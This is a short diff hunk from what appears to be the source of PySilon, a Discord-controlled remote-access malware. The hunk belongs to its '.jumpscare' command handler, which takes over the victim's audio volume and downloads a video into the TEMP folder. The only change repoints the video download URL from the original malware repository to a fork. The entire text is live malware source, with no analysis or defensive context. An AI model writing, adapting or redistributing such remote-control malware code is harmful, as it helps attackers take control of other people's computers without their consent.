@@ -13,7 +13,7 @@ elif message.content == '.jumpscare':
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = cast(interface, POINTER(IAudioEndpointVolume))
 
-    video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"
+    video_url = "https://github.com/MateAGYT/MateAGPySilon/raw/refs/heads/main/resources/jumpscare.mp4"
 
     temp_folder = os.environ['TEMP']
     temp_file = os.path.join(temp_folder, 'jumpscare.mp4')
